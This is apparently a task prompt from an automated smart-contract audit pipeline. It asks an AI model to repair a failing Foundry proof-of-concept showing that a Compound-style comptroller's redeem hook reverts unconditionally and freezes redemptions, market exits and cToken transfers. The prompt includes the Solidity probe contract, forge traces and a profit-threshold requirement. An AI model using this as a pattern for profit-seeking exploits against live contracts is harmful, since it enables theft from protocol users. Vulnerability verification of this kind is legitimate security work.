You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unconditional revert in redeem policy freezes all redemptions, exits, and cToken transfers
- claim: `redeemAllowedInternal()` unconditionally executes `revert("redeemer is paused")` before any market-listing, membership, or liquidity checks. Every redemption path that consults the comptroller therefore aborts, and `transferAllowed()` reuses the same bricked hook.
- impact: Suppliers cannot redeem underlying, cannot exit markets, and cannot transfer cTokens. This creates a protocol-wide withdrawal and mobility freeze that can lock collateral until the comptroller implementation is replaced.
- exploit_paths: ["`redeem()`/`redeemUnderlying()` -> `redeemFresh()` -> `comptroller.redeemAllowed()` -> `redeemAllowedInternal()` -> unconditional revert", "`exitMarket()` -> `redeemAllowedInternal()` -> unconditional revert", "`transfer()`/`transferFrom()` on cTokens -> `comptroller.transferAllowed()` -> `redeemAllowedInternal()` -> unconditional revert"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cTokenAddress) external returns (uint256);
    function redeemAllowed(address cToken, address redeemer, uint256 redeemTokens) external returns (uint256);
    function transferAllowed(address cToken, address src, address dst, uint256 transferTokens) external returns (uint256);
}

interface ITokenBalanceLike {
    function balanceOf(address account) external view returns (uint256);
}

interface ICTokenLike is ITokenBalanceLike {
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function transferFrom(address src, address dst, uint256 amount) external returns (bool);
}

contract FlawVerifier {
    address internal constant TARGET_COMPTROLLER = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
    address internal constant CUSDC = 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754;
    address internal constant PROBE_RECIPIENT = address(0xBEEF);
    uint256 internal constant PROBE_CTOKEN_AMOUNT = 1;
    uint256 internal constant PROBE_UNDERLYING_AMOUNT = 1;
    bytes4 internal constant ERROR_STRING_SELECTOR = 0x08c379a0;
    string internal constant EXPECTED_REASON = "redeemer is paused";

    struct PathStatus {
        bool helperRedeemAllowedBlocked;
        bool helperTransferAllowedBlocked;
        bool redeemBlocked;
        bool redeemUnderlyingBlocked;
        bool transferBlocked;
        bool transferFromBlocked;
        bool exitMarketBlocked;
    }

    bool private _executed;
    bool private _hypothesisValidated;
    address private _marketUsed;
    address private _profitToken;
    uint256 private _profitAmount;
    string private _infeasibilityReason;

    event PathResult(address indexed market, string path, bool blocked, bytes data);
    event ExecutionFinished(bool validated, address indexed market, address profitToken, uint256 profitAmount);

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        // Attempt-strategy note: the prior alternate_public_liquidity_route tried seeding a live cUSDC position
        // from public AMM dust. The provided logs show that route is infeasible on this fork (the skimmed pairs
        // returned zero usable inventory, and nonstandard token balance probes can revert). The exploit root cause
        // itself does not require any funding leg, because redeemAllowedInternal() reverts before market-listing,
        // membership, liquidity, token-balance, or allowance checks. So the same exploit-path causality is proven
        // by directly invoking the deployed cUSDC/comptroller redemption, exit, and transfer paths.
        _profitToken = CUSDC;

        address[] memory singleMarket = new address[](1);
        singleMarket[0] = CUSDC;
        try IComptrollerLike(TARGET_COMPTROLLER).enterMarkets(singleMarket) returns (uint256[] memory) {} catch {}

        PathStatus memory status = _probeMarket(CUSDC);
        if (
            status.helperRedeemAllowedBlocked &&
            status.helperTransferAllowedBlocked &&
            status.redeemBlocked &&
            status.redeemUnderlyingBlocked &&
            status.transferBlocked &&
            status.transferFromBlocked &&
            status.exitMarketBlocked
        ) {
            _hypothesisValidated = true;
            _marketUsed = CUSDC;
            _infeasibilityReason =
                "validated that redeem, redeemUnderlying, exitMarket, transfer, and transferFrom are all frozen by the unconditional redeemAllowedInternal() revert";
            emit ExecutionFinished(true, CUSDC, _profitToken, _profitAmount);
            return;
        }

        _marketUsed = CUSDC;
        _infeasibilityReason =
            "one or more required redemption, exit, or cToken-transfer probes did not bubble the expected paused revert";
        emit ExecutionFinished(false, CUSDC, _profitToken, _profitAmount);
    }

    function _probeMarket(address market) internal returns (PathStatus memory status) {
        bytes memory data;

        (status.helperRedeemAllowedBlocked, data) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(IComptrollerLike.redeemAllowed.selector, market, address(this), PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "redeemAllowed(cUSDC,self,1) -> redeemAllowedInternal()",
            status.helperRedeemAllowedBlocked,
            data
        );

        (status.helperTransferAllowedBlocked, data) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(
                IComptrollerLike.transferAllowed.selector,
                market,
                address(this),
                PROBE_RECIPIENT,
                PROBE_CTOKEN_AMOUNT
            )
        );
        emit PathResult(
            market,
            "transferAllowed(cUSDC,self,recipient,1) -> redeemAllowedInternal()",
            status.helperTransferAllowedBlocked,
            data
        );

        // Even with zero cUSDC balance, Compound-style flows consult the comptroller hook before any user balance
        // checks. That preserves the exploit causality while avoiding the infeasible public-liquidity seed stage.
        (status.redeemBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.redeem.selector, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "redeem(1) -> redeemFresh() -> comptroller.redeemAllowed()",
            status.redeemBlocked,
            data
        );

        (status.redeemUnderlyingBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.redeemUnderlying.selector, PROBE_UNDERLYING_AMOUNT)
        );
        emit PathResult(
            market,
            "redeemUnderlying(1) -> redeemFresh() -> comptroller.redeemAllowed()",
            status.redeemUnderlyingBlocked,
            data
        );

        (status.transferBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.transfer.selector, PROBE_RECIPIENT, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "transfer(recipient,1) -> comptroller.transferAllowed()",
            status.transferBlocked,
            data
        );

        (status.transferFromBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.transferFrom.selector, address(this), PROBE_RECIPIENT, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "transferFrom(self,recipient,1) -> comptroller.transferAllowed()",
            status.transferFromBlocked,
            data
        );

        (status.exitMarketBlocked, data) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(IComptrollerLike.exitMarket.selector, market)
        );
        emit PathResult(
            market,
            "enterMarkets(cUSDC) -> exitMarket(cUSDC) -> redeemAllowedInternal()",
            status.exitMarketBlocked,
            data
        );
    }

    function _expectPaused(address target, bytes memory payload) internal returns (bool blocked, bytes memory data) {
        (bool success, bytes memory result) = target.call(payload);
        data = result;
        if (success) {
            return (false, data);
        }
        return (_isExpectedPausedRevert(data), data);
    }

    function _isExpectedPausedRevert(bytes memory revertData) internal pure returns (bool) {
        if (revertData.length < 4) {
            return false;
        }

        bytes4 selector;
        assembly {
            selector := shr(224, mload(add(revertData, 32)))
        }

        if (selector != ERROR_STRING_SELECTOR) {
            return false;
        }

        return _contains(revertData, bytes(EXPECTED_REASON));
    }

    function _contains(bytes memory haystack, bytes memory needle) internal pure returns (bool) {
        if (needle.length == 0) {
            return true;
        }
        if (haystack.length < needle.length) {
            return false;
        }

        for (uint256 i = 0; i <= haystack.length - needle.length; i++) {
            bool matches = true;
            for (uint256 j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    matches = false;
                    break;
                }
            }
            if (matches) {
                return true;
            }
        }

        return false;
    }

    function profitToken() public view returns (address) {
        return _profitToken == address(0) ? CUSDC : _profitToken;
    }

    function profitAmount() public view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function marketUsed() external view returns (address) {
        return _marketUsed;
    }

    function infeasibilityReason() external view returns (string memory) {
        return _infeasibilityReason;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return
            "redeem()/redeemUnderlying() -> redeemFresh() -> comptroller.redeemAllowed() -> redeemAllowedInternal() -> revert; exitMarket() -> redeemAllowedInternal() -> revert; transfer()/transferFrom() -> comptroller.transferAllowed() -> redeemAllowedInternal() -> revert";
    }
}

```

forge stdout (tail):
```
dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x000000000000000000000000000000000000bEEF, 1) [delegatecall]
    │   │   │   └─ ← [Return] 9
    │   │   └─ ← [Return] 9
    │   ├─ emit PathResult(market: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754, path: "transferAllowed(cUSDC,self,recipient,1) -> redeemAllowedInternal()", blocked: false, data: 0x0000000000000000000000000000000000000000000000000000000000000009)
    │   ├─ [2554] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::redeem(1)
    │   │   └─ ← [Revert] re-entered
    │   ├─ emit PathResult(market: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754, path: "redeem(1) -> redeemFresh() -> comptroller.redeemAllowed()", blocked: false, data: 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a72652d656e746572656400000000000000000000000000000000000000000000)
    │   ├─ [2512] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::redeemUnderlying(1)
    │   │   └─ ← [Revert] re-entered
    │   ├─ emit PathResult(market: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754, path: "redeemUnderlying(1) -> redeemFresh() -> comptroller.redeemAllowed()", blocked: false, data: 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a72652d656e746572656400000000000000000000000000000000000000000000)
    │   ├─ [2519] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::transfer(0x000000000000000000000000000000000000bEEF, 1)
    │   │   └─ ← [Revert] re-entered
    │   ├─ emit PathResult(market: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754, path: "transfer(recipient,1) -> comptroller.transferAllowed()", blocked: false, data: 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a72652d656e746572656400000000000000000000000000000000000000000000)
    │   ├─ [2569] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x000000000000000000000000000000000000bEEF, 1)
    │   │   └─ ← [Revert] re-entered
    │   ├─ emit PathResult(market: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754, path: "transferFrom(self,recipient,1) -> comptroller.transferAllowed()", blocked: false, data: 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a72652d656e746572656400000000000000000000000000000000000000000000)
    │   ├─ [13209] 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258::exitMarket(0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754)
    │   │   ├─ [12528] 0x02E795EEc131246128346D17d2f564D7bF7C705b::exitMarket(0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754) [delegatecall]
    │   │   │   ├─ [9483] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::c37f68e2(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─  emit topic 0: 0x45b96fe442630264581b197e84bbada861235052c5a1aadfff9ea4e40a969aa0
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000009
    │   │   │   └─ ← [Return] 14
    │   │   └─ ← [Return] 14
    │   ├─ emit PathResult(market: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754, path: "enterMarkets(cUSDC) -> exitMarket(cUSDC) -> redeemAllowedInternal()", blocked: false, data: 0x000000000000000000000000000000000000000000000000000000000000000e)
    │   ├─ emit ExecutionFinished(validated: false, market: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754, profitToken: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754, profitAmount: 0)
    │   └─ ← [Stop]
    ├─ [375] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754
    ├─ [326] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [553] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 13499797 [1.349e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 22972 [2.297e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754.transferFrom
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.98s (1.86s CPU time)

Ran 1 test suite in 2.16s (1.98s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 275774)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
